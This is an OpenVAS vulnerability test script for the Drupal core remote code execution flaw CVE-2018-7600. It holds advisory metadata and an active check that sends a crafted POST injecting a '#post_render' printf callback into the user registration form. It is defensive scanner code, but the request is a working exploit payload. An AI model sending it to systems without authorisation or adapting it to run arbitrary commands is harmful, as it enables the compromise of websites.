###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_drupal_core_rce_vuln_SA-CORE-2018-002_active.nasl 9479 2018-04-14 11:30:08Z cfischer $
#
# Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) - (Active Check)
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:drupal:drupal';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108438");
  script_version("$Revision: 9479 $");
  script_cve_id("CVE-2018-7600");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-14 13:30:08 +0200 (Sat, 14 Apr 2018) $");
  script_tag(name:"creation_date", value:"2018-04-14 13:29:22 +0200 (Sat, 14 Apr 2018)");
  script_name("Drupal Core Critical Remote Code Execution Vulnerability (SA-CORE-2018-002) - (Active Check)");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("drupal_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("drupal/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.drupal.org/psa-2018-001");
  script_xref(name:"URL", value:"https://www.drupal.org/sa-core-2018-002");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/7.58");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/8.3.9");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/8.4.6");
  script_xref(name:"URL", value:"https://www.drupal.org/project/drupal/releases/8.5.1");
  script_xref(name:"URL", value:"https://research.checkpoint.com/uncovering-drupalgeddon-2/");

  script_tag(name:"summary", value:"This host is running Drupal and is prone
  to critical remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check the response.");

  script_tag(name:"insight", value:"The flaw exists within multiple subsystems
  of Drupal. This potentially allows attackers to exploit multiple attack
  vectors on a Drupal site, which could result in the site being completely
  compromised.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary code and completely compromise the site.

  Impact Level: Application");

  script_tag(name:"affected", value:"Drupal core versions 6.x and earlier,

  Drupal core versions 8.2.x and earlier,

  Drupal core versions 8.3.x to before 8.3.9,

  Drupal core versions 8.4.x to before 8.4.6,

  Drupal core versions 8.5.x to before 8.5.1 and

  Drupal core versions 7.x to before 7.58 on Windows.");

  script_tag(name:"solution", value:"Upgrade to Drupal core version 8.3.9 or
  8.4.6 or 8.5.1 or 7.58 later. Please see the refereced links for available updates.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

check = rand_str( length:16 );
# nb: URL rewriting on/off
urls = make_list( dir + "/user/register", dir + "/?q=user/register" );

foreach url( urls ) {

  # TODO: Only works for Drupal 8, Drupal 7 seems to handle this request differently
  url  = url + "?element_parents=account%2Fmail%2F%23value&ajax_form=1&_wrapper_format=drupal_ajax";
  data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=" + check;
  req  = http_post_req( port:port, url:url, data:data,
                        accept_header:"*/*",
                        add_headers:make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
  # neNWIz2mlhti89hQ[{"command":"insert","method":"replaceWith","selector":null,"data":"16\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
  if( egrep( string:res, pattern:"^" + check + "\[\{" ) ) {

    info['"HTTP POST" body'] = data;
    info['URL'] = report_vuln_url( port:port, url:url, url_only:TRUE );

    report  = 'By doing the following request:\n\n';
    report += text_format_table( array:info ) + '\n';
    report += 'it was possible to execute the "printf" command.';
    report += '\n\nResult:\n\n' + res;

    expert_info = 'Request:\n'+ req + 'Response:\n' + res + '\n';
    security_message( port:port, data:report, expert_info:expert_info );
    exit( 0 );
  }
}

exit( 99 );